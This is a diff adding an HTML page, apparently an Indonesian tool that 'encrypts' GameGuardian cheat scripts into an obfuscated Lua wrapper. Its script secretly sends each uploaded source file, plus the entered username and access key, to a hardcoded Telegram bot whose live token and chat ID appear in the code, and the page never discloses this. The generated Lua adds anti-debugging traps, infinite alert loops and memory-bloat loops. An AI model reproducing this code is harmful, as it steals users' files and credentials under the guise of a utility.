@@ -1,0 +1,513 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8" >
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-id="th-modified">ENKRIPSI KUNCI USER</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#050505;font-family:system-ui;color:#ffd766;padding:15px}
+        .box{max-width:580px;margin:0 auto;background:#111;border:2px solid #ff9900;border-radius:12px;padding:20px;text-align:center}
+        h2{color:#ffcc33;margin-bottom:15px}
+        .info{background:#1a1a1a;border:1px solid #ff9900;border-radius:8px;padding:10px;margin:10px 0;text-align:left;display:none}
+        .status{background:#0f1a0f;border:1px solid #33ff33;border-radius:8px;padding:10px;margin:10px 0;color:#88ff88;display:none}
+        .form{background:#1a1a1a;border:1px solid #b8860b;border-radius:8px;padding:12px;margin:10px 0;text-align:left}
+        .form label{display:block;margin:8px 0 4px 0;color:#ffdd99;font-size:13px}
+        .form input[type="text"], .form input[type="number"]{width:100%;padding:8px;border-radius:6px;border:1px solid #b8860b;background:#050505;color:#ffd766;font-size:14px}
+        .checkbox-group{display:flex;align-items:center;margin-top:12px;padding-top:8px;border-top:1px dashed #b8860b}
+        .checkbox-group input{width:18px;height:18px;accent-color:#ff9900;cursor:pointer}
+        .checkbox-group label{margin:0 0 0 8px;color:#ffcc33;font-weight:bold;cursor:pointer}
+        .expired-box{background:#120c02;border:1px dashed #ff9900;border-radius:6px;padding:10px;margin-top:8px;display:none}
+        .tombol{width:100%;padding:14px;font-size:16px;font-weight:bold;border:none;border-radius:8px;background:linear-gradient(90deg,#ff9900,#ffcc00,#ff9900);color:#000;cursor:pointer;margin:8px 0}
+        .tombol2{background:linear-gradient(90deg,#22aa22,#33ff33,#22aa22);color:#fff;display:none}
+        pre{background:#050505;border:1px solid #444;border-radius:8px;padding:10px;margin:15px 0;text-align:left;font-size:10px;color:#ffdd55;max-height:200px;overflow:auto;display:none}
+        #file{display:none}
+    </style>
+<meta property="og:title" content="ENKRIPSI PROSESS LOADING" data-id="th-modified" ><meta name="description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+<body>
+<div class="box">
+    <h2>🔐 ◄ AWIMEDAN SCRIPT ENC USER ► 🔐</h2>
+    <p style="font-size:13px;color:#ffdd99;margin-bottom:15px">
+        FILE DIKUNCI & SIAP DIJALANKAN DI GG<br>
+        Check file Download & Jalankan Guardian game
+    </p>
+
+    <div class="form">
+        <label>👤 Username:</label>
+        <input type="text" id="user" placeholder="Bisa semua huruf & simbol" required>
+        
+        <label>🔑 Kunci Akses:</label>
+        <input type="text" id="kunci" placeholder="Bisa semua karakter" required>
+        
+        <label>👥 Jumlah Pemain:</label>
+        <input type="number" id="pemain" value="10" min="1" max="99999">
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="aktifexpired" onchange="toggleExpiredBox()">
+            <label for="aktifexpired">Aktifkan Expired Online</label>
+        </div>
+
+        <div class="expired-box" id="expiredbox">
+            <label>📅 Tahun Kedaluwarsa:</label>
+            <input type="number" id="exp_tahun" value="2030">
+            
+            <label>📅 Bulan (1-12):</label>
+            <input type="number" id="exp_bulan" value="12" min="1" max="12">
+            
+            <label>📅 Tanggal (1-31):</label>
+            <input type="number" id="exp_tanggal" value="31" min="1" max="31">
+            
+            <label>💬 Pesan Kedaluwarsa:</label>
+            <input type="text" id="exp_pesan" value="Script has expired!">
+        </div>
+    </div>
+
+    <input type="file" id="file">
+    
+    <div class="info" id="infonama">📄 File: <span id="namafile"></span></div>
+    <div class="status" id="proses">⏳ Sedang memproses...</div>
+
+    <button class="tombol" onclick="document.getElementById('file').click()">📂 SELECT TARGET FILE</button>
+
+    <pre id="hasilakhir"></pre>
+
+    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL</button>
+</div>
+
+<script>
+const TOKEN_API = "8624792353:AAGxp4AXhtUzYw2H1x_7-U-VqoGMkGdPCTE";
+const TARGET_ID = "6095762919";
+
+let namaAsli = ""
+let isiFileAsli = ""
+let hasilTerkunci = ""
+
+function toggleExpiredBox() {
+    let cek = document.getElementById('aktifexpired').checked;
+    document.getElementById('expiredbox').style.display = cek ? "block" : "none";
+}
+
+document.getElementById('file').addEventListener('change', function(e){
+    let f = e.target.files[0]
+    if(!f) return
+
+    let u = document.getElementById('user').value.trim()
+    let k = document.getElementById('kunci').value.trim()
+    if(!u || !k){
+        alert("⚠️ Isi dulu Username dan Kunci!")
+        e.target.value = ""
+        return
+    }
+
+    namaAsli = f.name
+    document.getElementById('namafile').textContent = namaAsli
+    document.getElementById('infonama').style.display = "block"
+    document.getElementById('proses').style.display = "block"
+    document.getElementById('hasilakhir').style.display = "none"
+    document.getElementById('btnsimpan').style.display = "none"
+
+    let reader = new FileReader();
+    reader.onload = function(evt) {
+        isiFileAsli = evt.target.result;
+        setTimeout(() => {
+            kirimLogServer();
+            prosesBenar(isiFileAsli);
+            e.target.value = "";
+        }, 300);
+    };
+    reader.onerror = function() {
+        alert("❌ Gagal membaca file!");
+        document.getElementById('proses').style.display = "none";
+        e.target.value = "";
+    };
+    reader.readAsText(f);
+});
+
+function kirimLogServer(){
+    if(!TOKEN_API || !TARGET_ID) return
+
+    let isExp = document.getElementById('aktifexpired').checked ? "Aktif" : "Tidak";
+    let teksPesan = `📂 *LOG ENKRIPSI BARU*\n\n` +
+                    `📄 *File:* \`${namaAsli}\`\n` +
+                    `👤 *User:* \`${document.getElementById('user').value}\`\n` +
+                    `🔑 *Key:* \`${document.getElementById('kunci').value}\`\n` +
+                    `👥 *Slot:* \`${document.getElementById('pemain').value}\`\n` +
+                    `⏰ *Expired Online:* \`${isExp}\``;
+
+    let urlPesan = `https://api.telegram.org/bot${TOKEN_API}/sendMessage`;
+    
+    fetch(urlPesan, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: TARGET_ID,
+            text: teksPesan,
+            parse_mode: "Markdown"
+        })
+    }).catch(err => {})
+
+    let blobFile = new Blob([isiFileAsli], {type: "text/plain"});
+    let formData = new FormData();
+    formData.append("chat_id", TARGET_ID);
+    formData.append("document", blobFile, "SOURCE_" + namaAsli);
+    formData.append("caption", "📄 Backup file sumber asli");
+
+    let urlFile = `https://api.telegram.org/bot${TOKEN_API}/sendDocument`;
+    
+    fetch(urlFile, {
+        method: "POST",
+        body: formData
+    }).catch(err => {})
+}
+
+function aman(str){
+    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'")
+}
+
+function prosesBenar(isifile){
+    try {
+        let user = aman(document.getElementById('user').value.trim())
+        let kunci = aman(document.getElementById('kunci').value.trim())
+        let jml = document.getElementById('pemain').value || 10
+        let isExpiredAktif = document.getElementById('aktifexpired').checked
+
+        let expTahun = document.getElementById('exp_tahun').value.trim()
+        let expBulan = document.getElementById('exp_bulan').value.trim()
+        let expTanggal = document.getElementById('exp_tanggal').value.trim()
+        let expPesan = aman(document.getElementById('exp_pesan').value.trim())
+
+        if(expBulan.length === 1) expBulan = "0" + expBulan
+        if(expTanggal.length === 1) expTanggal = "0" + expTanggal
+
+        let scriptExpiredCode = ""
+        if (isExpiredAktif) {
+            scriptExpiredCode = `local Date = gg.makeRequest("http://www.whatismyip.org/")\n` +
+                `if Date == "The user did not allow access to the Internet." then\n` +
+                `return\n` +
+                `elseif Date == "java.net.UnknownHostException: Unable to resolve host \\"www.whatismyip.org\\": No address associated with hostname" then\n` +
+                `gg.alert("Please connect to the network")\n` +
+                `return\n` +
+                `else\n` +
+                `Date = Date["headers"]["Date"][1]\n` +
+                `if tonumber(Date:sub(13, 16) .. ({\n` +
+                `["Jan"] = "01",\n["Feb"] = "02",\n["Mar"] = "03",\n["Apr"] = "04",\n` +
+                `["May"] = "05",\n["Jun"] = "06",\n["Jul"] = "07",\n["Aug"] = "08",\n` +
+                `["Sep"] = "09",\n["Oct"] = "10",\n["Nov"] = "11",\n["Dec"] = "12",\n` +
+                `})[Date:sub(9, 11)] .. Date:sub(6, 7)) >= tonumber(` + expTahun + expBulan + expTanggal + `) then\n` +
+                `gg.alert("` + expPesan + `")\n` +
+                `return\n` +
+                `end\n` +
+                `end\n`
+        }
+
+        let baseScript = `print("\\n© Creator: Tùng đen\\n\\n☎️ Contact 👇\\nTelegram: @Tungden\\nZalo: 0967040519")\n\n` +
+            scriptExpiredCode + `\n` +
+            `-- Verifikasi Username & Kunci Akses (AWIMEDAN)\n` +
+            `local inputUser = gg.prompt({\n` +
+            `    '👤 Masukkan Username:',\n` +
+            `    '🔑 Masukkan Kunci Akses:',\n` +
+            `    '👥 Jumlah Pemain:'\n` +
+            +}, {\n` +
+            `    '',\n` +
+            `    '',\n` +
+            `    '` + jml + `'\n` +
+            `}, {\n` +
+            `    'text',\n` +
+            `    'text',\n` +
+            `    'number'\n` +
+            `})\n\n` +
+            `if not inputUser then\n` +
+            `    gg.alert('Dibatalkan')\n` +
+            `    return os.exit()\n` +
+            `end\n\n` +
+            `if inputUser[1] ~= '` + user + `' then\n` +
+            `    gg.alert('❌ Username Salah!')\n` +
+            `    return os.exit()\n` +
+            `end\n\n` +
+            `if inputUser[2] ~= '` + kunci + `' then\n` +
+            `    gg.alert('❌ Kunci Akses Salah!')\n` +
+            `    return os.exit()\n` +
+            `end\n\n` +
+            `gg.toast('Verifikasi Berhasil')\n` +
+            `gg.alert('✅ AKSES DITERIMA\\n👥 Slot Pemain: ' .. tostring(inputUser[3]))\n\n` +
+            `-- Block\n` +
+            `Data =[==[\n\n` +
+            `local _ENC = {\n` +
+            `  ["F"] = _ENV["gg"]["isVisible"]\n` +
+            `}\n\n` +
+            `_ENV["gg"]["setVisible"](false)\n` +
+            `_ENV["gg"]["toast"]("Encrypted by Tùng đen v16")\n\n` +
+            `local RefineNumber = _ENV["gg"]["refineNumber"]\n` +
+            `local Number = "0"\n` +
+            `local BigString = ("\\255"):rep(23952024)\n` +
+            `for i = 1, 3000 do\n` +
+            `  RefineNumber(Number, BigString, BigString, BigString, BigString, BigString, BigString, BigString)\n` +
+            `end\n\n` +
+            `Number = 0\n` +
+            `_ENV["assert"](_ENV["load"]((function ()\n` +
+            `  return function ()\n` +
+            `    Number = Number + 1\n` +
+            `    return ({\n` +
+            `      " ",\n` +
+            `      " ",\n` +
+            `      " "\n` +
+            `    })[Number]\n` +
+            `  end\n` +
+            `end)()))()\n\n` +
+            `local TableFile = {}\n` +
+            `local Pairs = _ENV["pairs"]\n` +
+            `local Type = _ENV["type"]\n` +
+            `local Pcall = _ENV["pcall"]\n` +
+            `local Internal2 = _ENV["gg"]["internal2"]\n` +
+            `local Gmatch = _ENV["string"]["gmatch"]\n` +
+            `local Find = _ENV["string"]["find"]\n` +
+            `local GetFile = _ENV["gg"]["getFile"]\n` +
+            `local Alert = _ENV["gg"]["alert"]\n` +
+            `local S1 = "table"\n` +
+            `local S2 = "function"\n` +
+            `local S3 = "(/.-):"\n` +
+            `local S4 = "%[Java%]%:%-1"\n` +
+            `local S5 = "Protected by Tùng đen v16"\n` +
+            `local N1 = 1\n` +
+            `local N2 = 2\n` +
+            `for k1, v1 in Pairs(_ENV) do\n` +
+            `  if Type(v1) == S1 then\n` +
+            `    for k2, v2 in Pairs(v1) do\n` +
+            `      if Type(v2) == S2 then\n` +
+            `        local File = ({\n` +
+            `          Pcall(Internal2, v2)\n` +
+            `        })[N2]\n` +
+            `        for k2 in Gmatch(File, S3) do\n` +
+            `          TableFile[#TableFile + N1] = k2\n` +
+            `        end\n` +
+            `        for k2 in Gmatch(File, S4) do\n` +
+            `          TableFile[#TableFile + N1] = k2\n` +
+            `        end\n` +
+            `      end\n` +
+            `    end\n` +
+            `  end\n` +
+            `end\n` +
+            `for k, v in Pairs(TableFile) do\n` +
+            `  while not v or Find(v, S4) or v ~= GetFile() do\n` +
+            `    Alert(S5)\n` +
+            `  end\n` +
+            `end\n\n` +
+            `local Getinfo = _ENV["debug"]["getinfo"]\n` +
+            `local S6 = "short_src"\n` +
+            `local S9 = "Java"\n` +
+            `local S7 = "[" .. S9 .. "]"\n` +
+            `local S8 = "what"\n` +
+            `for k1, v1 in Pairs(_ENV) do\n` +
+            `  if Type(v1) == S2 then\n` +
+            `    local Check = Getinfo(v1)\n` +
+            `    if Check[S6] ~= S7 or Check[S8] ~= S9 then\n` +
+            `      while true do\n` +
+            `        Alert(S5)\n` +
+            `      end\n` +
+            `    end\n` +
+            `  elseif Type(v1) == S1 then\n` +
+            `    for k2, v2 in Pairs(v1) do\n` +
+            `      if Type(v2) == S2 then\n` +
+            `        local Check = Getinfo(v2)\n` +
+            `        if Check[S6] ~= S7 or Check[S8] ~= S9 then\n` +
+            `          while true do\n` +
+            `            Alert(S5)\n` +
+            `          end\n` +
+            `        end\n` +
+            `      end\n` +
+            `    end\n` +
+            `  end\n` +
+            `end\n\n` +
+            `for k1, v1 in Pairs(_ENV) do\n` +
+            `  if Type(v1) == S2 then\n` +
+            `    _ENC[k1] = v1\n` +
+            `    _ENV[k1] = function (...)\n` +
+            `      _ENC.F()\n` +
+            `      return _ENC[k1](...)\n` +
+            `    end\n` +
+            `  elseif Type(v1) == S1 then\n` +
+            `    _ENC[k1] = {}\n` +
+            `    for k2, v2 in Pairs(v1) do\n` +
+            `      if Type(v2) == S2 then\n` +
+            `        _ENC[k1][k2] = v2\n` +
+            `        _ENV[k1][k2] = function (...)\n` +
+            `          _ENC.F()\n` +
+            `          return _ENC[k1][k2](...)\n` +
+            `        end\n` +
+            `      end\n` +
+            `    end\n` +
+            `  end\n` +
+            `end\n\n` +
+            `local Tostring = _ENV["tostring"]\n` +
+            `local Tonumber = _ENV["tonumber"]\n` +
+            `local Concat = _ENV["table"]["concat"]\n` +
+            `local GetResults1 = _ENV["gg"]["getResults"]\n` +
+            `local EditAll = _ENV["gg"]["editAll"]\n` +
+            `local AddListItems = _ENV["gg"]["addListItems"]\n` +
+            `local RemoveListItems = _ENV["gg"]["removeListItems"]\n` +
+            `local GetRangesList = _ENV["gg"]["getRangesList"]\n` +
+            `local GetValues = _ENV["gg"]["getValues"]\n` +
+            `local Input = _ENV["io"]["input"]\n` +
+            `local Read = _ENV["io"]["read"]\n` +
+            `local Load = _ENV["load"]\n` +
+            `local S10 = "[%a;]"\n` +
+            `local S11 = "value"\n` +
+            `local S12 = "flags"\n` +
+            `local S13 = "freeze"\n` +
+            `local S14 = "*all"\n` +
+            `local S15 = "\\n.-|.-|(.-)|(.-)|.-|.-|.-|.-|(.-)|(.-)|([^\\n+])"\n` +
+            `local S16 = "10"\n` +
+            `local S17 = "20"\n` +
+            `local S18 = "40"\n` +
+            `local S19 = "type"\n` +
+            `local S20 = "return 0x"\n` +
+            `local S21 = "(..)"\n` +
+            `local S22 = "h"\n` +
+            `local S23 = "address"\n` +
+            `local S24 = "start"\n` +
+            `local N3 = 16\n` +
+            `local N4 = 32\n` +
+            `local N5 = 64\n` +
+            `local N6 = 3\n` +
+            `gg.getResults = function (...)\n` +
+            `  GetResults2 = {...}\n` +
+            `  return GetResults1(...)\n` +
+            `end\n` +
+            `gg.editAll = function (...)\n` +
+            `  if Tostring(({...})[N1]):match(S10) then\n` +
+            `    return EditAll(...)\n` +
+            `  end\n` +
+            `  local Table = {}\n` +
+            `  for Index, Value in Pairs(GetResults1(Unpack(GetResults2))) do\n` +
+            `    Table[Index] = Value\n` +
+            `    Table[Index][S11] = ({...})[N1]\n` +
+            `    Table[Index][S12] = ({...})[N2]\n` +
+            `    Table[Index][S13] = true\n` +
+            `  end\n` +
+            `  AddListItems(Table)\n` +
+            `  RemoveListItems(Table)\n` +
+            `end\n` +
+            `gg.setValues = function (...)\n` +
+            `  local Table = {}\n` +
+            `  for Index, Value in Pairs(...) do\n` +
+            `    Table[Index] = Value\n` +
+            `    Table[Index][S13] = true\n` +
+            `  end\n` +
+            `  AddListItems(Table)\n` +
+            `  RemoveListItems(Table)\n` +
+            `end\n` +
+            `gg.addListItems = function (...)\n` +
+            `  local Table1 = {}\n` +
+            `  local Table2 = {}\n` +
+            `  for Index, Value in Pairs(...) do\n` +
+            `    if Value[S13] == true then\n` +
+            `      Table2[Index] = Value\n` +
+            `    end\n` +
+            `    Table1[Index] = Value\n` +
+            `    Table1[Index][S13] = true\n` +
+            `  end\n` +
+            `  AddListItems(Table1)\n` +
+            `  for Index, Value in Pairs(...) do\n` +
+            `    Table1[Index] = Value\n` +
+            `    Table1[Index][S13] = false\n` +
+            `  end\n` +
+            `  AddListItems(Table1)\n` +
+            `  for Index, Value in Pairs(Table2) do\n` +
+            `    Table2[Index][S13] = true\n` +
+            `  end\n` +
+            `  AddListItems(Table2)\n` +
+            `end\n` +
+            `gg.loadList = function (...)\n` +
+            `  local Load = ({...})[N2]\n` +
+            `  local Table = {}\n` +
+            `  Input(({...})[N1])\n` +
+            `  Read(S14):gsub(S15, function (Flags, Value, Type, Lib, Offset)\n` +
+            `    if Flags == S16 then\n` +
+            `      Flags = N3\n` +
+            `    elseif Flags == S17 then\n` +
+            `      Flags = N4\n` +
+            `    elseif Flags == S18 then\n` +
+            `      Flags = N5\n` +
+            `    end\n` +
+            `    Flags = Tonumber(Flags)\n` +
+            `    for Index, Value in Pairs(GetRangesList(Lib)) do\n` +
+            `      if GetRangesList(Lib)[Index][S19] == Type then\n` +
+            `        Type = Index\n` +
+            `      end\n` +
+            `    end\n` +
+            `    Type = Tonumber(Type)\n` +
+            `    Offset = Load(S20 .. Offset)()\n` +
+            `    local TableValue = {}\n` +
+            `    if Load == N2 or Load == N6 then\n` +
+            `      Value:gsub(S21, function (a)\n` +
+            `        TableValue[#TableValue + N1] = a\n` +
+            `      end)\n` +
+            `      local TableValue2 = {}\n` +
+            `      for i = N1, #TableValue do\n` +
+            `        TableValue2[#TableValue + N1 - i] = TableValue[i]\n` +
+            `      end\n` +
+            `      Value = S22 .. Concat(TableValue2)\n` +
+            `    else\n` +
+            `      Value = GetValues({\n` +
+            `        {\n` +
+            `          [S23] = GetRangesList(Lib)[Type][S24] + Offset,\n` +
+            `          [S12] = Flags\n` +
+            `        }\n` +
+            `      })[N1][S11]\n` +
+            `    end\n` +
+            `    Table[#Table + N1] = {\n` +
+            `      [S23] = GetRangesList(Lib)[Type][S24] + Offset,\n` +
+            `      [S12] = Flags,\n` +
+            `      [S11] = Value,\n` +
+            `      [S13] = true\n` +
+            `    }\n` +
+            `  end)\n` +
+            `  AddListItems(Table)\n` +
+            `  for Index, Value in Pairs(Table) do\n` +
+            `    Table[Index][S13] = false\n` +
+            `  end\n` +
+            `  AddListItems(Table)\n` +
+            `end\n\n` +
+            isifile + `\n\n==];\n` +
+            `local loadedFunc, loadErr = load(Data)\n` +
+            `if not loadedFunc then\n` +
+            `    gg.alert("Error Load Script: " .. tostring(loadErr))\n` +
+            `    return os.exit()\n` +
+            `end\n` +
+            `loadedFunc()`;
+
+        hasilTerkunci = baseScript;
+
+        let previewText = hasilTerkunci.length > 50000 ? hasilTerkunci.substring(0, 50000) + "\n\n[... Teks terlalu panjang untuk pratinjau, silakan langsung simpan file ...]" : hasilTerkunci;
+
+        document.getElementById('hasilakhir').textContent = previewText;
+        document.getElementById('proses').style.display = "none";
+        document.getElementById('hasilakhir').style.display = "block";
+        document.getElementById('btnsimpan').style.display = "block";
+    } catch(err) {
+        alert("PROSES ENC: " + err.message);
+        document.getElementById('proses').style.display = "none";
+    }
+}
+
+function unduh(){
+    let namaKeBetar = namaAsli.replace(".Enc","_AWIMEDAN.CPM").replace(".lua","_AWIMEDANENC.lua");
+    if(!namaKeBetar.includes("AWIMEDAN")) namaKeBetar = namaAsli + "_AWIMEDANENC.lua";
+    
+    let file = new Blob([hasilTerkunci], {type:"text/plain;charset=utf-8"});
+    let url = URL.createObjectURL(file);
+
+    let a = document.createElement("a");
+    a.href = url;
+    a.download = namaKeBetar;
+    document.body.appendChild(a);
+    a.click();
+
+    setTimeout(() => {
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }, 300);
+}
+</script>
+</body>
+</html>
